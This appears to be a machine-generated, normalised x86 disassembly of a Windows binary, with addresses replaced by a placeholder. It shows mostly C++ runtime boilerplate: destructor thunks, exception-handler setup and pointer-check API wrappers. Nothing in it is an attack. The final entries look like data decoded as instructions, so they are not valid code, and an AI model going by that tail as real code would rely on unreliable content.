call sub_42247a
pop ecx
retn
sub_4295db
mov ecx rwxdata
jmp sub_429cc1
sub_4295e5
call sub_4295ef
jmp sub_4295fc
sub_4295ef
push 0x0
mov ecx rwxdata
call sub_429cb6
retn
sub_4295fc
push sub_429608
call sub_42247a
pop ecx
retn
sub_429608
mov ecx rwxdata
jmp sub_429cc1
sub_429612
call sub_42961c
jmp sub_429629
sub_42961c
push 0x0
mov ecx rwxdata
call sub_429cb6
retn
sub_429629
push sub_429635
call sub_42247a
pop ecx
retn
sub_429635
mov ecx rwxdata
jmp sub_429cc1
sub_42963f
call sub_429649
jmp sub_429658
sub_429649
push 0x1
push 0x0
mov ecx rwxdata
call sub_429a39
retn
sub_429658
push sub_429664
call sub_42247a
pop ecx
retn
sub_429664
mov ecx rwxdata
jmp sub_42966e
sub_42966e
mov eax [ ecx ]
add ecx 0x8
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] rwxdata
jmp sub_4299c6
sub_429683
call sub_42968d
jmp sub_42969c
sub_42968d
push 0x1
push 0x0
mov ecx rwxdata
call sub_42991d
retn
sub_42969c
push sub_4296a8
call sub_42247a
pop ecx
retn
sub_4296a8
mov ecx rwxdata
jmp sub_4296b2
sub_4296b2
mov eax [ ecx ]
add ecx 0x4
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] rwxdata
jmp sub_4299c6
sub_4296c7
call sub_4296d1
jmp sub_4296e0
sub_4296d1
push 0x1
push 0x0
mov ecx rwxdata
call sub_42991d
retn
sub_4296e0
push sub_4296ec
call sub_42247a
pop ecx
retn
sub_4296ec
mov ecx rwxdata
jmp sub_4296b2
sub_4296f6
call sub_429700
jmp sub_42970f
sub_429700
push 0x1
push 0x0
mov ecx rwxdata
call sub_42991d
retn
sub_42970f
push sub_42971b
call sub_42247a
pop ecx
retn
sub_42971b
mov ecx rwxdata
jmp sub_4296b2
sub_42988c
dec [ rwxdata ]
jne rwxdata
retn
mov ecx rwxdata
call sub_42997c
mov ecx rwxdata
call sub_42997c
mov ecx rwxdata
jmp sub_42997c
sub_4299c6
mov [ ecx ] rwxdata
jmp sub_42a5dc
sub_429af8
mov [ ecx ] rwxdata
add ecx 0x34
jmp sub_428a89
sub_429b06
or ax 0xffff
retn 0x4
sub_429b0d
xor eax eax
retn
sub_429b10
or ax 0xffff
retn
sub_429cb3
retn 0x4
sub_429cb6
mov eax ecx
mov [ eax ] rwxdata
retn 0x4
sub_42a161
mov eax [ ecx + 0x50 ]
test eax eax
je rwxdata
xor eax eax
retn
push eax
call sub_423f80
test eax eax
pop ecx
jge rwxdata
or eax 0xffffffff
retn
sub_42a17a
push esi
lea esi [ ecx - 0x4 ]
mov ecx esi
call sub_4296b2
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42a199
push esi
mov esi ecx
call sub_4299c6
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42a1b5
push esi
lea esi [ ecx - 0x8 ]
mov ecx esi
call sub_42966e
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42a1d4
push esi
mov esi ecx
call sub_429af8
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42a1f0
push esi
mov esi ecx
call sub_429cc1
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42a256
mov eax [ ecx + 0x2c ]
mov edx [ esp + 0x4 ]
sub [ eax ] edx
mov eax [ ecx + 0x1c ]
lea ecx [ edx + edx ]
add [ eax ] ecx
retn 0x4
sub_42a26a
mov eax [ ecx + 0x2c ]
inc [ eax ]
mov eax [ ecx + 0x1c ]
add [ eax ] 0xfffffffe
mov eax [ ecx + 0x1c ]
mov eax [ eax ]
retn
sub_42a27b
mov eax [ ecx + 0x2c ]
dec [ eax ]
mov ecx [ ecx + 0x1c ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
retn
sub_42a28b
mov eax [ ecx + 0x30 ]
mov edx [ esp + 0x4 ]
sub [ eax ] edx
mov eax [ ecx + 0x20 ]
lea ecx [ edx + edx ]
add [ eax ] ecx
retn 0x4
sub_42a29f
mov eax [ ecx + 0x30 ]
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
retn
sub_42a32c
test [ rwxdata ] 0x1
jne rwxdata
call sub_42a356
test [ rwxdata ] 0x1
jne rwxdata
or [ rwxdata ] 0x1
jmp sub_42a362
or [ rwxdata ] 0x1
sub_42a356
push sub_42a8c9
call sub_42247a
pop ecx
retn
sub_42a362
push sub_42a8c9
call sub_42247a
pop ecx
retn
sub_42a46e
mov eax [ ecx + 0x10 ]
test eax eax
jne rwxdata
retn
mov eax rwxdata
sub_42a4d5
push esi
mov esi ecx
call sub_42a498
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42a5c4
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_42a4f1
mov [ esi ] rwxdata
mov eax esi
pop esi
retn 0x4
sub_42a62c
push esi
mov esi ecx
call sub_42a5dc
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42a719
push 0x1
call sub_429175
retn
sub_42a7ef
call sub_42a7f9
jmp sub_42a7fa
sub_42a7f9
retn
sub_42a7fa
push sub_42a806
call sub_42247a
pop ecx
retn
sub_42a806
mov ecx rwxdata
jmp sub_428a89
sub_42a8c9
retn
sub_42a984
mov [ ecx ] rwxdata
retn
sub_42a98b
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] rwxdata
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42a9a8
push esi
mov esi ecx
call sub_42a9c4
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42aa45
test [ rwxdata ] 0x1
jne rwxdata
call sub_42aa6f
test [ rwxdata ] 0x1
jne rwxdata
or [ rwxdata ] 0x1
jmp sub_42aa7b
or [ rwxdata ] 0x1
sub_42aa6f
push sub_42a8c9
call sub_42247a
pop ecx
retn
sub_42aa7b
push sub_42a8c9
call sub_42247a
pop ecx
retn
sub_42aa87
push [ esp + 0x4 ]
call sub_423e39
pop ecx
retn
sub_42abaa
push esi
mov esi ecx
call sub_42ab6d
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42ac99
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_42abc6
mov [ esi ] rwxdata
mov eax esi
pop esi
retn 0x4
sub_42ad81
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_42abc6
mov [ esi ] rwxdata
mov eax esi
pop esi
retn 0x4
sub_42ad99
test [ rwxdata ] 0x1
jne rwxdata
call sub_42adc3
test [ rwxdata ] 0x1
jne rwxdata
or [ rwxdata ] 0x1
jmp sub_42adcf
or [ rwxdata ] 0x1
sub_42adc3
push sub_42a8c9
call sub_42247a
pop ecx
retn
sub_42adcf
push sub_42a8c9
call sub_42247a
pop ecx
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_42af34
mov [ ecx ] rwxdata
mov ecx [ ecx + 0x4 ]
test ecx ecx
je rwxdata
retn
push ecx
call sub_423e39
pop ecx
sub_42af49
push esi
mov esi ecx
call sub_42af34
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42af99
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_42afa0
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_42b1c6
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42b24c
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_42b407
mov edx [ esp + 0x4 ]
dec [ edx + 0x4 ]
js rwxdata
push edx
call sub_42c398
pop ecx
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
retn
sub_42b4cf
mov eax [ esp + 0x8 ]
push 0x0
push [ eax + 0x4 ]
push [ eax ]
push [ esp + 0x10 ]
call sub_42c750
add esp 0x10
retn
sub_42b588
push 0x1
push [ esp + 0x8 ]
call sub_42305f
pop ecx
pop ecx
retn
sub_42b861
push esi
mov esi ecx
call sub_42b904
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42aa87
pop ecx
sub_42b904
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] rwxdata
je rwxdata
retn
push [ ecx + 0x4 ]
call sub_42aa87
pop ecx
sub_42b91a
mov eax [ ecx + 0x4 ]
test eax eax
jne rwxdata
retn
mov eax rwxdata
sub_42be52
push [ ebp - 0x14 ]
call sub_42be89
pop ecx
retn
sub_42be89
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je rwxdata
jmp sub_42c2ec
xor eax eax
retn
sub_42bfb6
push [ ebp - 0x14 ]
call sub_42c026
pop ecx
retn
sub_42c208
push 0x1
pop eax
retn
sub_42c20c
mov esp [ ebp - 0x18 ]
jmp sub_42c2ec
sub_42c26a
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_42c273
mov esp [ ebp - 0x18 ]
jmp sub_42c2ec
sub_42c329
push 0x1
pop eax
retn
sub_42c37f
push 0x1
pop eax
retn
sub_42caf6
push sub_42cab0
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rwxdata ] eax
retn
sub_42cb07
push [ rwxdata ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_42cb14
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je rwxdata
mov eax esi
pop esi
retn
xor esi esi
sub_42cb30
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je rwxdata
mov eax esi
pop esi
retn
xor esi esi
sub_42cb4c
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je rwxdata
mov eax esi
pop esi
retn
xor esi esi
sub_42cda0
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cdb0
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cdc0
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cdd0
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cde0
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cdf0
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42ce00
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42ce10
mov eax rwxdata
jmp sub_42aff6
sub_42ce1c
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je rwxdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_428938
sub_42ce36
mov eax rwxdata
jmp sub_42aff6
sub_42ce40
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je rwxdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_428938
sub_42ce5a
mov eax rwxdata
jmp sub_42aff6
sub_42ce64
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je rwxdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_428938
sub_42ce7e
mov eax rwxdata
jmp sub_42aff6
sub_42ce88
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je rwxdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_428938
sub_42cea2
mov eax rwxdata
jmp sub_42aff6
sub_42ceac
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_428a89
sub_42ceb7
mov ecx [ ebp - 0x10 ]
jmp sub_428abd
sub_42cebf
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_428a89
sub_42ceca
mov eax rwxdata
jmp sub_42aff6
sub_42ced4
mov ecx [ ebp - 0x10 ]
jmp sub_428abd
sub_42cedc
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_428a89
sub_42cee7
mov eax rwxdata
jmp sub_42aff6
sub_42cef4
mov eax rwxdata
jmp sub_42aff6
sub_42cf00
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cf10
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cf20
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cf30
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cf40
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cf50
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cf60
push rwxdata
push [ ebp - 0x14 ]
call sub_42a8c9
pop ecx
pop ecx
retn
sub_42cf70
mov eax rwxdata
jmp sub_42aff6
sub_42cf7c
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je rwxdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_4299c6
sub_42cf96
mov eax rwxdata
jmp sub_42aff6
sub_42cfa0
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je rwxdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x4
jmp sub_4299c6
sub_42cfba
mov eax rwxdata
jmp sub_42aff6
sub_42cfc4
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je rwxdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_4299c6
sub_42cfde
mov eax rwxdata
jmp sub_42aff6
sub_42cfe8
mov eax [ ebp - 0x10 ]
and eax 0x1
test eax eax
je rwxdata
retn
mov ecx [ ebp - 0x14 ]
add ecx 0x8
jmp sub_4299c6
sub_42d002
mov eax rwxdata
jmp sub_42aff6
sub_42d00c
mov ecx [ ebp - 0x10 ]
add ecx 0x34
jmp sub_428a89
sub_42d017
mov ecx [ ebp - 0x10 ]
jmp sub_429af8
sub_42d01f
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_428a89
sub_42d02a
mov eax rwxdata
jmp sub_42aff6
sub_42d034
mov ecx [ ebp - 0x10 ]
jmp sub_429af8
sub_42d03c
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_428a89
sub_42d047
mov eax rwxdata
jmp sub_42aff6
sub_42d054
lea ecx [ ebp - 0x1c ]
jmp sub_42a719
sub_42d05c
mov eax rwxdata
jmp sub_42aff6
sub_42d068
mov ecx [ ebp - 0x14 ]
jmp sub_42b904
sub_42d070
mov eax rwxdata
jmp sub_42aff6
sub_42d07c
mov ecx [ ebp - 0x10 ]
jmp sub_42b904
sub_42d084
mov eax rwxdata
jmp sub_42aff6
sub_42d090
mov ecx [ ebp - 0x10 ]
jmp sub_42b904
sub_42d098
mov eax rwxdata
jmp sub_42aff6
sub_42d0a4
mov ecx [ ebp - 0x10 ]
jmp sub_42b904
sub_42d0ac
mov eax rwxdata
jmp sub_42aff6
sub_42d0b8
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_428a89
sub_42d0c3
mov eax rwxdata
jmp sub_42aff6
sub_42d0d0
lea ecx [ ebp - 0x4 ]
jmp sub_42a8c9
sub_42d0d8
push [ ebp - 0x10 ]
call sub_42aa87
pop ecx
retn
sub_42d0e2
mov eax rwxdata
jmp sub_42aff6
sub_42d0ec
lea ecx [ ebp - 0x4 ]
jmp sub_42a8c9
sub_42d0f4
mov eax rwxdata
jmp sub_42aff6
sub_42d100
mov ecx [ ebp - 0x10 ]
jmp sub_42a984
sub_42d108
mov eax rwxdata
jmp sub_42aff6
sub_42d114
mov ecx [ ebp - 0x10 ]
jmp sub_42a984
sub_42d11c
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_42a719
sub_42d127
lea ecx [ ebp - 0x4 ]
jmp sub_42a8c9
sub_42d12f
mov eax rwxdata
jmp sub_42aff6
sub_42d13c
lea ecx [ ebp - 0x20 ]
jmp sub_42a719
sub_42d144
mov eax rwxdata
jmp sub_42aff6
sub_42d150
mov ecx [ ebp - 0x14 ]
jmp sub_42b904
sub_42d158
mov eax rwxdata
jmp sub_42aff6
sub_42d164
mov ecx [ ebp - 0x10 ]
jmp sub_42b904
sub_42d16c
mov eax rwxdata
jmp sub_42aff6
sub_42d178
mov ecx [ ebp - 0x10 ]
jmp sub_42b904
sub_42d180
mov eax rwxdata
jmp sub_42aff6
sub_42d18c
mov ecx [ ebp - 0x10 ]
jmp sub_42b904
sub_42d194
mov eax rwxdata
jmp sub_42aff6
sub_42d1a0
lea ecx [ ebp - 0x20 ]
jmp sub_42a719
sub_42d1a8
mov eax rwxdata
jmp sub_42aff6
sub_42d1b4
mov ecx [ ebp - 0x10 ]
jmp sub_42b904
sub_42d1bc
mov eax rwxdata
jmp sub_42aff6
sub_42d1eb
jmp [ eax - 0xffbd33 ]
sub_42d3bb
push [ eax ]
iretd
sub_42d3d3
jmp [ eax - 0x31 ]
sub_42d44b
inc esp
iretd
sub_42d5ab
[ eax - 0x30 ]
sub_42d643
jmp [ eax + edx * 8 + 0x5200042 ]
